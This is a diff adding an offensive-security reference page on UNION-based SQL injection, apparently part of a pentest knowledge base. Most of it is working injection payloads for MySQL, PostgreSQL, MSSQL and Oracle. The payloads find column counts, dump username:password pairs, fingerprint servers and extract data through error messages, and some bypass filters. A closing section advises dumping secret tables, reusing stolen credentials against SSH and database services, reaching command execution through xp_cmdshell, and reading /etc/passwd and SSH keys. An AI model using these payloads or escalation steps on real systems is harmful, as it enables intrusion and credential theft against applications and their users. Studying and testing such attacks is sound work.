@@ -1,0 +1,220 @@
+---
+title: UNION-based SQLi
+description: Extracting data via UNION SELECT when query results are reflected in the response.
+mitre: [T1190, T1213]
+d3fend: [D3-MH, D3-MA]
+impact: [DataExfil]
+owasp: [A05]
+noise: moderate
+sidebar:
+  order: 4
+  label: UNION-based
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+When the application reflects query results in the HTTP response, `UNION SELECT` lets you append your own query and read its output directly.
+
+## TL;DR
+
+```
+' ORDER BY 1-- -          # increment until error → column count
+' ORDER BY N-- -          # last successful N = column count
+' UNION SELECT 1,2,3-- -  # find which columns are reflected
+' UNION SELECT 1,@@version,3-- -  # replace reflected column with payload
+```
+
+Once you know column count and which columns are visible, you can `UNION` arbitrary `SELECT` statements.
+
+## Step 1 - Determine column count
+
+UNION requires the same number of columns in both queries. Two methods:
+
+### Method A - `ORDER BY`
+
+Increment until you get an error:
+
+```
+' ORDER BY 1-- -    # works
+' ORDER BY 2-- -    # works
+' ORDER BY 3-- -    # works
+' ORDER BY 4-- -    # error → there are 3 columns
+```
+
+**Success indicator:** the page works on `N` and errors on `N+1`. Column count is `N`.
+
+### Method B - `UNION SELECT NULL`
+
+```
+' UNION SELECT NULL-- -                  # error if not 1 column
+' UNION SELECT NULL,NULL-- -             # error if not 2 columns
+' UNION SELECT NULL,NULL,NULL-- -        # works → 3 columns
+```
+
+`NULL` is type-agnostic and works regardless of column data types. Use this when `ORDER BY` is filtered or doesn't produce clear feedback.
+
+## Step 2 - Find reflected columns
+
+Replace `NULL`s with distinct integers to identify which positions appear in the response:
+
+```
+' UNION SELECT 1,2,3,4-- -
+```
+
+If the page shows `2` and `4` in the output, those positions are reflected. Place your payload there:
+
+```
+' UNION SELECT 1,@@version,3,4-- -
+```
+
+If only string columns are reflected (numbers cause errors), use string literals:
+
+```
+' UNION SELECT 'a','b','c','d'-- -
+' UNION SELECT 'a',@@version,'c','d'-- -
+```
+
+## Step 3 - Single-reflection trick
+
+When only one column is reflected, concatenate everything into it:
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    ' UNION SELECT NULL, CONCAT(user, ':', password), NULL FROM users-- -
+    ' UNION SELECT NULL, GROUP_CONCAT(username, ':', password SEPARATOR '<br>'), NULL FROM users-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    ' UNION SELECT NULL, user || ':' || password, NULL FROM users-- -
+    ' UNION SELECT NULL, STRING_AGG(username || ':' || password, '<br>'), NULL FROM users-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    ' UNION SELECT NULL, user + ':' + password, NULL FROM users-- -
+    ' UNION SELECT NULL, STRING_AGG(username + ':' + password, '<br>'), NULL FROM users-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    ' UNION SELECT NULL, user || ':' || password, NULL FROM users-- -
+    ' UNION SELECT NULL, LISTAGG(username || ':' || password, '<br>') WITHIN GROUP (ORDER BY username), NULL FROM users-- -
+    ```
+  </TabItem>
+</Tabs>
+
+## Common useful payloads
+
+Once UNION works, use it to fingerprint and read system data:
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    ' UNION SELECT NULL, @@version, NULL-- -
+    ' UNION SELECT NULL, USER(), NULL-- -
+    ' UNION SELECT NULL, database(), NULL-- -
+    ' UNION SELECT NULL, @@hostname, NULL-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    ' UNION SELECT NULL, version(), NULL-- -
+    ' UNION SELECT NULL, current_user, NULL-- -
+    ' UNION SELECT NULL, current_database(), NULL-- -
+    ' UNION SELECT NULL, inet_server_addr(), NULL-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    ' UNION SELECT NULL, @@version, NULL-- -
+    ' UNION SELECT NULL, SYSTEM_USER, NULL-- -
+    ' UNION SELECT NULL, DB_NAME(), NULL-- -
+    ' UNION SELECT NULL, @@SERVERNAME, NULL-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    ' UNION SELECT NULL, banner, NULL FROM v$version-- -
+    ' UNION SELECT NULL, USER, NULL FROM dual-- -
+    ' UNION SELECT NULL, SYS_CONTEXT('USERENV','HOST'), NULL FROM dual-- -
+    ```
+  </TabItem>
+</Tabs>
+
+For schema/table/column enumeration, see [Enumeration](../enumeration/).
+
+<Aside type="caution">
+Oracle requires every `SELECT` to specify a table. Use `dual`:
+```
+' UNION SELECT NULL, USER, NULL FROM dual-- -
+```
+Without `FROM dual`, Oracle returns a syntax error.
+</Aside>
+
+## Data type mismatches
+
+If `UNION SELECT 1,2,3` errors with a type mismatch, one of the original query's columns is non-integer. Try:
+
+```
+' UNION SELECT NULL,NULL,NULL-- -            # NULL fits any type
+' UNION SELECT 'a','a','a'-- -               # all strings
+' UNION SELECT 1,'a',NULL-- -                # mix until it works
+```
+
+Iterate column-by-column to find which positions need strings vs. numbers vs. NULL.
+
+## Common failure modes
+
+- **No output despite no error** - the application takes only the first row. Add `ORDER BY id DESC LIMIT 1 OFFSET <N>` (MySQL) to access other rows, or use a payload that forces your row to be first.
+- **`UNION` keyword filtered** - try `UnIoN`, `/*!UNION*/` (MySQL), `UNION ALL`. See [Filter bypasses](../bypasses/).
+- **Errors visible but no UNION result** - the app catches errors and shows them but doesn't render row data. Use error-based extraction below.
+- **Stacked queries blocked but you need them** - UNION cannot run `INSERT`/`UPDATE`/`DELETE` or stored procedures. For destructive queries you need stacked query support (MSSQL, PostgreSQL).
+
+## Error-based extraction
+
+When errors are reflected but rows aren't, force the data into an error message:
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL (modern)">
+    ```sql
+    -- extractvalue trick (MySQL 5.1+)
+    ' AND extractvalue(1, concat(0x7e, (SELECT @@version)))-- -
+    ```
+  </TabItem>
+  <TabItem label="MySQL (legacy)">
+    ```sql
+    -- duplicate entry trick (older MySQL)
+    ' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT @@version),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    ' AND 1=cast((SELECT version()) AS int)-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    ' AND 1=convert(int,(SELECT @@version))-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    ' AND 1=(SELECT to_number((SELECT banner FROM v$version WHERE rownum=1)) FROM dual)-- -
+    ```
+  </TabItem>
+</Tabs>
+
+The injected expression returns a string; the cast/convert/extractvalue forces it into an error message that includes the string.
+
+**Success indicator:** error message contains the data you tried to extract (e.g., the database version appears inside a "Conversion failed" or "XPATH syntax error" message).
+
+## Next move
+
+- **Got data back via UNION** → escalate scope: dump all tables (`information_schema.tables`), then dump rows from interesting tables - start with `users`, `admin`, `credentials`, anything ending in `_keys` or `_secrets`
+- **`UNION` keyword filtered** → try `UnIoN`, `/*!UNION*/`, or fall back to [Bypasses](/codex/web/sqli/bypasses/) for case/comment variants
+- **Column count probes returning errors instead of difference** → switch to [error-based extraction](#error-based-extraction-as-fallback) - useful when ORDER BY/UNION SELECT are blocked but error reflection works
+- **No output reflected in response** → not actually UNION-viable; move to [Boolean blind](/codex/web/sqli/blind-boolean/) or [Time-based blind](/codex/web/sqli/blind-time/)
+- **Got DB credentials from a dumped users table** → try them against the application login, SSH, MSSQL/MySQL native ports ([MSSQL](/codex/network/services/mssql/)), and any other services on the host
+- **MSSQL backend with admin creds** → [xp_cmdshell for RCE](/codex/network/services/mssql/)
+- **File-read primitive available (`LOAD_FILE` / `pg_read_file`)** → [File operations](/codex/web/sqli/file-operations/) - extract `/etc/passwd`, app configs, SSH keys
